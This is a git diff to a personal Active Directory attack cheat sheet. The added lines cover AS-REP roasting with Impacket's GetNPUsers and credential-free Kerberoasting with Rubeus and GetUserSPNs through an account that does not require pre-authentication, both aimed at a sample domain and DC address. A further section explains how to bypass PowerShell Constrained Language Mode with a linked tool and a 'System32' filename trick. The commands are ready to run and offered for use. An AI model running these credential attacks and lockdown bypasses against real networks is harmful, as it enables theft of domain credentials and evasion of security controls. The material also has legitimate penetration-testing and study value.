@@ -12,6 +12,7 @@ This is my personal safe for arsenals. Feel free to refer and use at anytime. Yo
 		* [Unconstrained / Constrained Object](#unconstrained--constrained-object)
 	* **[Constrained Language Mode](#constrained-language-mode)**
 		* [CLM Enumeration](#clm-enumeration)
+		* [Bypassing CLM](#bypassing-clm)
 		* [Dump lsass with rundll32](#dump-lsass-process-with-signed-binary)
 * **[Delegations](#delegations)**
 	* [Unconstrained Delegation](#unconstrained-delegation)
@@ -157,8 +158,14 @@ Get-DomainTrust
 ```
 ### ASREP Roasting
 ```
+# PowerView
 Get-DomainUser -PreauthNotRequired
+
+# Impacket
+GetNPUsers.py kiwi.local/bethany.linnell -no-pass -dc-ip 192.168.86.189
+GetNPUsers.py kiwi.local/ -usersfile /tmp/users.lst -no-pass -dc-ip 192.168.86.189
 ```
+
 ### Kerberoasting
 ```
 # Powerview
@@ -167,6 +174,19 @@ Get-DomainUser -SPN
 # Rubeus
 Rubeus.exe kerberoast /nowrap
 ```
+**Update**: There was a researched that have been done by [@exploitph](https://twitter.com/exploitph), a user that has `Not-RequirePreAuth` property enabled can perform [Kerberoasting](#kerberoasting) without needing the password of the account. Detailed explanation can be read [here](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/). 
+> When a ticket is requested without pre-authentication, the result still includes an encrypted part. This encrypted part is encrypted with the credential key used for authentication and contains the session key for the ticket included within the reply. This is the encrypted data used in the [ASREPRoast attack](https://blog.harmj0y.net/activedirectory/roasting-as-reps/) by [Will Schroeder](https://twitter.com/harmj0y). The resulting TGT is usable only with access to the requesting accounts key, since the TGT session key is required. However, for Kerberoasting, access to the session key is not required. Only the resulting ST—or more accurately, the encrypted part of the ST, which is not secured with the requesting accounts key—is required. Therefore, if any account is configured to not require pre-authentication, it is possible to Kerberoast without **any** credentials.
+```
+# Rubeus
+.\Rubeus.exe kerberoast /domain:kiwi.local /dc:192.168.86.189 /nopreauth:bethany.linnel /spns:users.txt
+
+# Impacket
+GetUserSPNs.py kiwi.local/ -no-preauth bethany.linnell -usersfile /tmp/users.lst -dc-ip 192.168.86.189
+```
+**References**
+* https://www.semperis.com/blog/new-attack-paths-as-requested-sts/
+* https://twitter.com/_nwodtuhs/status/1575082377189429250?s=20&t=iS5ugj6lp5GyL6QF4jWn0Q
+
 ### Unconstrained / Constrained Object
 ```
 # unconstrained computer
@@ -183,6 +203,14 @@ You can abuse these delegation permission by referring [here](#unconstrained-del
 ```
 $ExecutionContext.SessionState.LanguageMode
 ```
+### Bypassing CLM
+1. **Spawn a new FLM powershell console**
+There are multiple simple ways to bypass this lockdown mechanism. One of the cool techniques is by spawning a new FLM powershell session that interacts with the `System.Management.Automation.dll` runspace directly instead of executing under powershell.exe process. This can be done with this cool repo [here](https://github.com/calebstewart/bypass-clm)
+
+2. **Name your script to contain "System32" string**
+As referred to this [article](https://www.blackhillsinfosec.com/constrained-language-mode-bypass-when-pslockdownpolicy-is-used/), Microsoft has mentioned that when applying CLM using `__PSLockdownPolicy` variable, there are ways to bypass since the system only checks if the path contains the "System32" string.
+> In addition, there are also file naming conventions that enable FullLanguage mode on a script, effectively bypassing Constrained Language.
+![](./src/images/clm1.png)
 ### View AppLocker Rules
 ```
 Get-AppLockerPolicy -Effective | Select -ExpandProperty RuleCollections
